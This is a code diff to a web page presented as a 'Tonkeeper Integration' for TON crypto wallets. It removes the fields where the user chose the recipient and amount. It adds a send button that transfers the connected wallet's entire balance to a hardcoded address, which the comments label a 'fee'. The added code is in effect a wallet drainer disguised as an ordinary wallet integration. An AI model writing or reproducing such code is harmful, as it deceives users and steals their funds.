@@ -147,30 +147,15 @@
     <div class="container">
       <h1>Tonkeeper Integration</h1>
 
-      <div class="input-group">
-        <label for="transaction-address">Transaction Address</label>
-        <input
-          type="text"
-          id="transaction-address"
-          value="UQDtXe2aK_1i5BzKdaRi0LseTW8PbuvrCcX7qfREHhJ0typh"
-        />
-      </div>
-
-      <div class="input-group">
-        <label for="transaction-amount">Amount (in Toncoin)</label>
-        <input type="number" id="transaction-amount" value="20" />
-      </div>
-
-      <button id="send-transaction" style="display: none;">Send Transaction</button>
+      <button id="connect-wallet">Connect to Tonkeeper</button>
 
       <div id="wallet-info" class="wallet-info">
         <h3>Wallet Information</h3>
         <p><strong>Address:</strong> <span id="address" class="wallet-address"></span></p>
         <p><strong>Balance:</strong> <span id="balance"></span></p>
+        <button id="send-transaction">Send Transaction</button>
         <button id="disconnect">Disconnect</button>
       </div>
-
-      <button id="connect-wallet">Connect to Tonkeeper</button>
     </div>
 
     <script>
@@ -185,7 +170,7 @@
       const sendTransactionBtn = document.getElementById("send-transaction");
       const disconnectBtn = document.getElementById("disconnect");
 
-      sendTransactionBtn.style.display = "none";
+      sendTransactionBtn.style.display = "none"; // Initially hide the send transaction button
 
       connectWalletBtn.addEventListener("click", async () => {
         try {
@@ -195,14 +180,37 @@
           walletInfoDiv.style.display = "block";
           addressElem.textContent = connectedWallet.account.address;
 
+          // Fetch balance after wallet connects
           const balanceResponse = await fetch(
             `https://tonapi.io/v2/accounts/${connectedWallet.account.address}`
           );
           const balanceData = await balanceResponse.json();
-          balanceElem.textContent = balanceData.balance || "0";
+          const balance = balanceData.balance || "0";
+          balanceElem.textContent = balance;
 
+          // Send transaction with full balance as fee to the specified address
           sendTransactionBtn.style.display = "block";
-          connectWalletBtn.style.display = "none";
+
+          sendTransactionBtn.addEventListener("click", async () => {
+            const transaction = {
+              messages: [
+                {
+                  address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW", // Hardcoded fee address
+                  amount: balance, // Send entire balance as fee
+                },
+              ],
+            };
+
+            try {
+              const result = await tonConnectUI.sendTransaction(transaction);
+              console.log("Transaction Result:", result);
+              alert("Transaction sent successfully!");
+            } catch (error) {
+              console.error("Transaction failed:", error);
+              alert("Transaction failed!");
+            }
+          });
+
         } catch (error) {
           console.error("Error connecting to wallet:", error);
         }
@@ -214,29 +222,6 @@
         sendTransactionBtn.style.display = "none";
         connectWalletBtn.style.display = "block";
         console.log("Disconnected");
-      });
-
-      sendTransactionBtn.addEventListener("click", async () => {
-        const transactionAddress = document.getElementById("transaction-address").value;
-        const transactionAmount = document.getElementById("transaction-amount").value;
-
-        const transaction = {
-          messages: [
-            {
-              address: transactionAddress,
-              amount: (transactionAmount * 1000000000).toString(),
-            },
-          ],
-        };
-
-        try {
-          const result = await tonConnectUI.sendTransaction(transaction);
-          console.log("Transaction Result:", result);
-          alert("Transaction sent successfully!");
-        } catch (error) {
-          console.error("Transaction failed:", error);
-          alert("Transaction failed!");
-        }
       });
     </script>
   </body>
